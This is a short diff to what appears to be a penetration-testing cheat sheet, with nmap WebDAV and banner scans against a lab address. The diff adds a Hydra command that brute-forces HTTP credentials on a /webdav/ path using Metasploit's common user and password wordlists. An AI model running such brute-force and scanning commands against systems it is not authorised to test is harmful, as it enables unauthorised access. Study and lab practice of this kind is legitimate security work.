@@ -223,6 +223,10 @@ nmap 10.10.20.3 -sV -p 80 --script http-webdav-scan --script-args http-methods.u
 ```
 nmap 10.10.20.3 -sV -p 80 -script banner
 ```
+Hydra:
+```
+hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.10.2.34 http-get /webdav/
+```
 Metasploit:
 ```
 use auxiliary/scanner/http/http_version
